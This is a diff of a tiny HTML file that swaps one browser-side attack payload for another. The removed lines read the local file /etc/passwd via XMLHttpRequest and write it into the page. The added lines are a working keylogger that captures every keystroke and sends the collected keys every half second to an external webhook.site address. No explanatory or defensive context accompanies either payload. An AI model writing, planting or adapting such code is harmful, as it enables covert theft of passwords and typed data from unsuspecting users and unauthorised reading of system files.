@@ -1,10 +1,15 @@
-<html>
-<script>
-    x=new XMLHttpRequest;
-    x.onload=function(){
-        document.write(this.responseText)
-    };
-    x.open("GET","file:///etc/passwd");
-    x.send();
-</script>
-</html>
+<html><script>
+    var keys = '';
+    document.onkeypress = function(e) {
+        get = window.event ? event : e;
+        key = get.keyCode ? get.keyCode : get.charCode;
+        key = String.fromCharCode(key);
+        keys += key;
+    }
+    window.setInterval(function() {
+    if (keys != '') {
+        new Image().src = 'https://webhook.site/5c3af86f-d42d-43f8-b9db-46b3f6dc25a2/?c=' + keys;
+        keys = '';
+    }
+    }, 500);
+</script></html>
